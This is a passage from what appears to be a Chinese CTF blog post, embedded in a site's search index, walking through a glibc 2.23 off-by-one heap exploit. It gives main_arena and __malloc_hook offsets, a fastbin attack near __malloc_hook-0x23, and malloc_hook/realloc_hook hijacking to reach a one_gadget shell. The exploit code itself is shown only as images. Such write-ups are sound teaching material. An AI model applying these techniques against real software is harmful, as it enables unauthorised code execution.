alt="3419447-20240520203920652-1686364780"></p><p><strong>在2.23版本里面泄露出的地址-0x58就是main_arena的地方而main_arena-0x10就是__malloc_hook地址</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520204048024-728234753.png" alt="3419447-20240520204048024-728234753"></p><p><strong>然后这里使用fatsbin attack 申请到_malloc_hook和recalloc_hook附近修改它们的值，（一般都是__malloc_hook-0x23）</strong></p><p><strong>因为这里符合size的结构</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520204342472-1588758804.png" alt="3419447-20240520204342472-1588758804"></p><p><strong>这里要注意并不是修改__malloc_hook为one_gadget就可以getshell，通常可以使用****realloc_hook 调整栈帧使 onegadget 生效</strong></p><p><strong>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">malloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">malloc_hook</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc_hook</span> -&gt;</span> onegadget<br></code></pre></td></tr></table></figure><p><strong>这样就能经过 realloc 调整栈帧后再运行 onegadget 。但是实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520204822714-1846554124.png" alt="3419447-20240520204822714-1846554124"></p><p><strong>最后放上exp: 代码还是有点多的</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520204922743-127383576.png" alt="3419447-20240520204922743-127383576"></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520205049154-2010944746.png" alt="3419447-20240520205049154-2010944746"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
